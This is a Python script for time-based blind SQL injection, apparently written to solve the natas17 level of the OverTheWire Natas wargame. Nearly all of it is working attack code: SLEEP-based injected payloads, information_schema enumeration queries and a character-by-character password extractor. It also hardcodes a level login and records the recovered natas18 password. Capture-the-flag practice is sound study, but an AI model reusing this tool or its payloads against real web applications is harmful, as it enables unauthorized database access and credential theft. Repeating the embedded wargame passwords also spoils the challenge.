import sys
import requests
import time
from pprint import pprint

''' ==========================================================================
To Do:
- Logging
- Command line arguments
- Limit rate of requests
- Customise timings (potentially automate calculation of optimal timings)
- Improve guessing of upper/lower case characters.
- Persist data to disk - avoid repeating tests.
- Word Lists for guessing/correlating
- Rationalise database, table, column, field enumeration
'''



valid_chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


class SqlAttack:

    def __init__(self, urlroot, sqlframe, logging = False):
        self.logging = logging
        self.urlroot = urlroot
        self.set_sqlframe (sqlframe)
        self.timeframe = 'OR (SELECT SLEEP(5) FROM DUAL WHERE {})'
        if not self.testConn():
            raise Exception('Failed to connect.')

    def set_urlroot (self, newroot):
        self.urlroot = newroot

    def set_sqlframe (self, frame):
        self.sqlhead, self.sqltail = frame.split('$')

    def set_timeframe (self, frame):
        self.timeframe = frame

    def testConn (self):
        r = self.singleReq ('OR 1=2')
        return r.status_code == requests.codes.ok

    def singleReq (self, test_string, timeout_val=None):
        req = self.urlroot + self.sqlhead + test_string + self.sqltail
        if self.logging:
            print req
        return requests.get (req, timeout=timeout_val)

    def singleTimedReq (self, test_string):
        tstart = time.time()
        try:
            self.singleReq (self.timeframe.format(test_string), 1)
        except requests.exceptions.Timeout:
            return True
        return False

    def checkItemExists (self, query_string):
        return self.singleTimedReq (query_string + " LIKE '%'")

    def calcItemLen (self, item_name):
        placeholder = '_'
        for i in range(1,40):
            if self.singleTimedReq (item_name + ' LIKE "' + placeholder + '"'):
                return i
            placeholder += '_'
        return 0

    def calcItemChars (self, item_name):
        used_chars = ''
        for c in valid_chars:
            sys.stdout.write (c)
            sys.stdout.flush()
            if self.singleTimedReq (item_name + ' LIKE BINARY "%' + c + '%"'):
                used_chars += c
            else:
                sys.stdout.write ("\033[1D")
                sys.stdout.flush()
        print " "
        return used_chars

    def calcItemValue (self, item_name, max_len, chars, value = ''):
        sys.stdout.write (value)
        sys.stdout.flush()
        for n in range (len(value),max_len):
            for c in chars:
                sys.stdout.write (c)
                sys.stdout.flush()
                if self.singleTimedReq (item_name + ' LIKE BINARY "' + value + c + '%"'):
                    value += c
                    break

                sys.stdout.write ("\033[1D")
                sys.stdout.flush()

        return value

    def checkItemValue (self, query_string, value):
        return self.singleTimedReq (query_string + " = '" + value + "'")

    @staticmethod
    def getDatabaseQuery():
        return "database()"

    @staticmethod
    def getTableWithColumnQuery (column_name):
        return "(select table_name from information_schema.columns where table_schema=database() and column_name like '%" + column_name + "%' limit 0,1)"

    @staticmethod
    def getColumnQuery (table_name, column_name):
        return "(select column_name from information_schema.columns where table_schema=database() and table_name='" + table_name + "' and column_name like '%" + column_name + "%' limit 0,1)"

    @staticmethod
    def getRecordQuery (table_name, column_wanted, column_name, column_value):
        return "(select " + column_wanted + " from " + table_name + " where " + column_name + "='" + column_value + "')"

    def fullQuery (self, query_string):
        if self.checkItemExists (query_string):
            len = self.calcItemLen (query_string)
            print "Length = ", len
            chars = self.calcItemChars (query_string)
            print "Characters = ", chars
            value = self.calcItemValue (query_string, len, chars)
            print "Value = ", value
            correct = self.checkItemValue (query_string, value)
            print "Correct Value = ", correct
        else:
            print "Does Not Exist"



auth_username = "natas17"
auth_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
auth_full     = auth_username + ":" + auth_password + "@"
target_url = "http://" + auth_full + auth_username + ".natas.labs.overthewire.org/"
url_params = "?debug=1&username="




print 'STARTING....'

print 'Initial test.'

try:
    attack = SqlAttack (target_url + url_params, '" $; -- ', False)
    #attack.fullQuery (SqlAttack.getDatabaseQuery())
    #attack.fullQuery (SqlAttack.getTableWithColumnQuery('pass'))
    #attack.fullQuery (SqlAttack.getColumnQuery('users', 'user'))
    #attack.fullQuery (SqlAttack.getRecordQuery ('users', 'password', 'username', 'natas18'))
    #print attack.calcItemLen (SqlAttack.getRecordQuery ('users', 'password', 'username', 'natas18'))
    attack.sqlhead = ""
    attack.sqltail = ""
    attack.timeframe = 'natas18" AND IF({}, SLEEP(10), NULL) %23'

    known_chars = ''
    vchars = '047dghjlmpqsvwxyCDFIKOPR'
    #vchars = attack.calcItemChars ('password')
    print attack.calcItemValue ('password', 32, vchars, known_chars)
    #print attack.calcItemValue (SqlAttack.getRecordQuery ('users', 'password', 'username', 'natas18'), 32, '047cdghjlmpqsvwxyCDFIKOPR', "xvKIqDjy4OPv7w")
    #xvKIqD7dyD
except KeyboardInterrupt as e:
    print "\nProgram Terminated by User"

## RESULT = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
